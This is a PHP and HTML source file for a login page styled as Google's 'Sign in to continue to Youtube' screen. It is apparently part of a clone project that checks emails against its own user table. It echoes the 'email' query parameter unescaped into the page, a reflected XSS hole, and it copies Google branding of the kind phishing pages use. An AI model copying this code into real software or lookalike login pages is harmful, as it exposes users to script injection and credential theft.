<?php

include '../../Dashboard/Required.php';
$errors = [];
$email= '';

if(isset($_POST['submit_btn'])){
    $email = $_POST['email'];
    $errors = array();

    if(empty($email)){
        $errors['email'] = '<p style="color:crimson;">Enter an email</p>';
    } else if(!filter_var($email, FILTER_VALIDATE_EMAIL)){
        $errors['email'] = '<p style="color:crimson;">Enter a valid email</p>';
    }

    if(empty($errors)){
        $stmt = $conn->prepare("SELECT * FROM user_info WHERE email = ?");
        $stmt->bind_param("s", $email);
        $stmt->execute();
        $result = $stmt->get_result();
        
        if(mysqli_num_rows($result) == 0){
            $errors['email'] = '<p style="color:crimson;">Could not find your google accout</p>';
        } else {
            header('Location: Enter_pass.php?email=' . $email);
            exit();
        }
    }
}


?>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
        Sign in to your Google account
    </title>
    <link rel="stylesheet" href="sign.css">
</head>
<body>
    <div class="wrapper">
    <div class="container">
        <div class="centered">
    <div class="logo"><img src="../images/Google_logo.svg" alt=""></div>
    <div class="paragraph1"><p>Sign in</p></div>
    <div class="paragraph2"><p>to continue to Youtube</p></div>
    </div>
<form action="" method="post">
    <div class="form-top">
<input type="text" name="email" value="<?php if(isset($_GET['email'])){
    $email_back= $_GET['email'];
    echo $email_back;
    }else{
    echo $email;} ?>" class="input1 <?php echo isset($errors['email']) ? 'is-invalid' : '' ?>" required>
<div class="lab1 <?php echo isset($errors['email']) ? 'is-invalid-lab' : '' ?>"><label for="">Email</label></div></div>
<div class="invalid-feedback"><?php echo $errors['email'] ?? '' ?></div>
<div>
    <div class="p-total">
    <div class="paragraph3"><p>Not your computer? Use Guest mode to sign in privately.</p></div>
    <button><a href="https://support.google.com/chrome/answer/6130773?hl=en">Learn more</a></button>
    </div>
    <div class="bottom-btn">
<button><a href="../register.php">Create Account</a></button>
<input type="submit" value="Next" name="submit_btn" formnovalidate>
</div>
</div>
</form>

</div>

<div class="bottom-nav">
<div class="bottom-row">
            <div>
                <div class="current-lang"><p>English(United States)</p><i class='fas fa-caret-down'></i></div>
                <div class="dropdown">
                    <div><p>English(United States)</p></div>
                    <div><p>English(United Kingdom)</p></div>
                    <div><p>French</p> </div>
                    <div><p>German</p> </div>
                    <div><p>Czech</p> </div>
                    <div><p>Hungarian</p> </div>
                    <div><p>Kiswahili</p> </div>
                    <div><p>Arabic</p> </div>
                    <div><p>Spanish</p> </div>
                    <div><p>Chinese</p> </div>
                    <div><p>Hungarian</p> </div>
                    <div><p>Kiswahili</p> </div>
                    <div><p>Arabic</p> </div>
                    <div><p>Spanish</p> </div>
                    <div><p>Chinese</p> </div>
                </div>
             </div>
              
</div> 
<div class="bottom-links">
                <a href="">Help</a>
                <a href="">Privacy</a>
                <a href="">Terms</a>
        </div>
</div>

</div>



</body>
<script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
<script src="sign.js"></script>
</html>